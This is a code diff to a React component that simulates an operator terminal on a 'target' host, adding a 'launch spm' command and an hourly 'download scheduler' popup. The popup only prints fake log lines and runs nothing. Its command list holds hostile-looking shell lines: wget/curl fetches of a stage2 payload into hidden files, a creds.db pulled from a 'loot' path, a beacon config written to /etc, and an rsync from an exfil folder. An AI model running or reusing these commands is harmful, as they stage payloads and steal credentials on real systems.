@@ -1,4 +1,4 @@
-import { useEffect, useRef, useState } from "react";
+import { useEffect, useRef, useState, useCallback } from "react";
 
 interface Props {
   onClose: () => void;
@@ -37,6 +37,7 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
   const [history, setHistory] = useState<string[]>([]);
   const [hIdx, setHIdx] = useState(-1);
   const [config, setConfig] = useState<ConfigState | null>(null);
+  const [showDownloadPopup, setShowDownloadPopup] = useState(false);
   const inputRef = useRef<HTMLInputElement>(null);
   const bottomRef = useRef<HTMLDivElement>(null);
   const cwd = "/root";
@@ -109,6 +110,10 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
     }
   };
 
+  const openDownloadPopup = useCallback(() => {
+    setShowDownloadPopup(true);
+  }, []);
+
   const runStartSpm = () => {
     const seq = [
       "[*] spm :: secure profile manager v2.4.1",
@@ -124,6 +129,24 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
     });
   };
 
+  const runLaunchSpm = () => {
+    const seq = [
+      "[*] spm :: secure profile manager v2.4.1",
+      "[*] loading /root/.spm/profile.cfg ...",
+      "[*] verifying signature ...",
+      "[+] signature OK",
+      "[*] negotiating relay handshake ...",
+      "[*] binding listener ...",
+      "[+] spm runtime online — awaiting tasks.",
+      "[*] initializing scheduled download module ...",
+      "[+] download scheduler active — interval: 1h",
+    ];
+    seq.forEach((line, i) => {
+      setTimeout(() => setLines((p) => [...p, line]), 220 * (i + 1));
+    });
+    setTimeout(() => openDownloadPopup(), 220 * (seq.length + 2));
+  };
+
   const run = (raw: string) => {
     const trimmed = raw.trim();
     setLines((p) => [...p, `root@${rhost}:${cwd}# ${raw}`]);
@@ -131,6 +154,7 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
     setHistory((h) => [...h, trimmed]);
 
     if (trimmed === "start spm") { runStartSpm(); return; }
+    if (trimmed === "launch spm") { runLaunchSpm(); return; }
 
     const [bin, ...args] = trimmed.split(/\s+/);
     const arg = args.join(" ");
@@ -138,7 +162,7 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
     switch (bin) {
       case "help":
         out.push("commands: ls, pwd, whoami, id, uname, ifconfig, ps, cat, echo, date,");
-        out.push("          configure, start spm, history, clear, exit");
+        out.push("          configure, start spm, launch spm, history, clear, exit");
         break;
       case "configure": startConfig(); return;
       case "ls": out.push("Desktop  Documents  Downloads  loot  notes.md  profile.cfg  sessions.db"); break;
@@ -265,6 +289,142 @@ export default function PopupTerminal({ onClose, rhost = "target", lhost = "oper
           <span>HOST: <span className="text-terminal-green">{rhost}</span></span>
           <span>VIA: <span className="text-terminal-yellow">{lhost}</span></span>
           <span>PTY: <span className="text-terminal-cyan">/dev/pts/2</span></span>
+        </div>
+      </div>
+
+      {showDownloadPopup && (
+        <DownloadScheduler
+          rhost={rhost}
+          onClose={() => setShowDownloadPopup(false)}
+        />
+      )}
+    </div>
+  );
+}
+
+/* ── Download Scheduler Popup ─────────────────────────────────── */
+
+const DOWNLOAD_COMMANDS = [
+  "wget -qO /tmp/.cache https://{rhost}:8443/payload/stage2.bin",
+  "curl -sSfL https://cdn.ops.internal/modules/recon.tar.gz | tar xz -C /opt/.modules/",
+  "scp -o StrictHostKeyChecking=no root@{rhost}:/var/spool/tasks/heartbeat.sh /tmp/",
+  "wget --no-check-certificate https://{rhost}:9090/loot/creds.db -O /root/.spm/creds.db",
+  "curl -sk https://relay.ops.internal/config/beacon.json -o /etc/.beacon.json",
+  "rsync -az --progress root@{rhost}:/opt/exfil/ /root/loot/",
+  "wget -r -np -nH --cut-dirs=2 https://{rhost}:8443/drops/ -P /tmp/.drops/",
+  "curl -H 'X-Auth: spm-token' https://{rhost}:8443/api/tasks -o /var/spool/tasks.json",
+];
+
+function DownloadScheduler({ rhost, onClose }: { rhost: string; onClose: () => void }) {
+  const [dlLines, setDlLines] = useState<string[]>([]);
+  const [countdown, setCountdown] = useState(3600);
+  const [cycle, setCycle] = useState(1);
+  const bottomRef = useRef<HTMLDivElement>(null);
+
+  const generateBatch = useCallback((cycleNum: number) => {
+    const ts = new Date().toISOString();
+    const header = `\n── CYCLE ${cycleNum} | ${ts} ──`;
+    const count = 2 + Math.floor(Math.random() * 3);
+    const shuffled = [...DOWNLOAD_COMMANDS].sort(() => Math.random() - 0.5).slice(0, count);
+    const cmds = shuffled.map((c) => c.replace(/\{rhost\}/g, rhost));
+    const batch = [
+      header,
+      `[*] scheduled download batch #${cycleNum} — ${count} tasks`,
+      ...cmds.map((c) => `$ ${c}`),
+      ...cmds.map((_, i) => `[+] task ${i + 1}/${count} complete — ${(Math.random() * 4 + 0.5).toFixed(1)}s`),
+      `[+] batch #${cycleNum} finished — next in 3600s`,
+    ];
+    return batch;
+  }, [rhost]);
+
+  // Initial batch on mount
+  useEffect(() => {
+    const boot = [
+      "[*] spm download scheduler v1.2.0",
+      "[*] interval: 3600s (1h)",
+      `[*] target: ${rhost}`,
+      "[+] scheduler armed — executing first batch now...",
+    ];
+    const initial = generateBatch(1);
+    setDlLines([...boot, ...initial]);
+  }, [rhost, generateBatch]);
+
+  // Countdown timer
+  useEffect(() => {
+    const id = setInterval(() => {
+      setCountdown((c) => {
+        if (c <= 1) {
+          setCycle((prev) => {
+            const next = prev + 1;
+            const batch = generateBatch(next);
+            setDlLines((p) => [...p, ...batch]);
+            return next;
+          });
+          return 3600;
+        }
+        return c - 1;
+      });
+    }, 1000);
+    return () => clearInterval(id);
+  }, [generateBatch]);
+
+  useEffect(() => { bottomRef.current?.scrollIntoView({ block: "end" }); }, [dlLines]);
+
+  const mins = Math.floor(countdown / 60);
+  const secs = countdown % 60;
+
+  return (
+    <div className="fixed inset-0 z-[60] flex items-center justify-center p-4">
+      <div className="pointer-events-auto absolute inset-0 bg-background/50" onClick={onClose} />
+      <div
+        className="relative z-10 flex w-full max-w-lg flex-col overflow-hidden rounded-lg border border-terminal-green/60 font-mono shadow-[0_0_60px_oklch(0.55_0.18_145_/_0.4)]"
+        style={{
+          background: "linear-gradient(180deg, oklch(0.06 0.02 145) 0%, oklch(0.03 0.01 145) 100%)",
+        }}
+        onClick={(e) => e.stopPropagation()}
+      >
+        {/* Title bar */}
+        <div className="flex items-center justify-between border-b border-terminal-green/40 bg-terminal-green/[0.06] px-3 py-2">
+          <div className="flex items-center gap-2">
+            <div className="flex gap-1.5">
+              <button onClick={onClose} className="h-2.5 w-2.5 rounded-full bg-terminal-red hover:opacity-80" aria-label="Close" />
+              <span className="h-2.5 w-2.5 rounded-full bg-terminal-yellow" />
+              <span className="h-2.5 w-2.5 rounded-full bg-terminal-green" />
+            </div>
+            <span className="ml-2 text-[10px] font-bold uppercase tracking-[0.3em] text-terminal-green">
+              spm // download scheduler
+            </span>
+          </div>
+          <span className="flex items-center gap-2">
+            <span className="rounded-sm border border-terminal-yellow/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-yellow">
+              next: {String(mins).padStart(2, "0")}:{String(secs).padStart(2, "0")}
+            </span>
+            <span className="rounded-sm border border-terminal-green/50 px-1.5 py-0.5 text-[9px] font-bold uppercase tracking-widest text-terminal-green">
+              ACTIVE
+            </span>
+          </span>
+        </div>
+
+        {/* Log body */}
+        <div className="h-[320px] overflow-y-auto px-3 py-2 text-[11px] leading-relaxed">
+          <div className="text-terminal-green">░ D O W N L O A D   S C H E D U L E R ░</div>
+          <div className="mb-2 text-muted-foreground">Automated fetch cycle — interval 1h · close to dismiss</div>
+          {dlLines.map((l, i) => {
+            const color = l.startsWith("──") ? "text-terminal-cyan"
+              : l.startsWith("[+]") ? "text-terminal-green"
+              : l.startsWith("[*]") ? "text-terminal-yellow"
+              : l.startsWith("$") ? "text-foreground/90"
+              : "text-muted-foreground";
+            return <div key={i} className={`whitespace-pre-wrap break-all ${color}`}>{l}</div>;
+          })}
+          <div ref={bottomRef} />
+        </div>
+
+        {/* Status bar */}
+        <div className="flex items-center justify-between border-t border-terminal-green/40 bg-terminal-green/[0.06] px-3 py-1 text-[9px] uppercase tracking-wider text-muted-foreground">
+          <span>CYCLE: <span className="text-terminal-green">{cycle}</span></span>
+          <span>INTERVAL: <span className="text-terminal-yellow">3600s</span></span>
+          <span>HOST: <span className="text-terminal-green">{rhost}</span></span>
         </div>
       </div>
     </div>
